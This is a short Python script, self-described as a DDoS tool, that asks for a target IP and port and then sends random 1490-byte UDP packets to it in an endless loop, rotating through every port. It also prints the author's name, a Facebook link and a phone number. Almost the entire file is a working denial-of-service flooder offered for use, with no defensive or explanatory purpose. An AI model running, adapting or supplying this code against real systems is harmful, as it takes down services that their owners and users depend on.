#THis Script For DDOS-Ip 
#A Distributed Denial of Service (DDoS) attack is an attempt to make an online service unavailable
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS-IP")

print ("Author   : Mahmoud S.ALi")
print ("Facebook : https://www.facebook.com/mody.saber.96343405")
print ("WhatsApp : 01117374028")

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack-Starting")
print ("Your IP Target is : {}".format(ip))
time.sleep(3)
print ("Your Port Target is : {}".format(port))
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
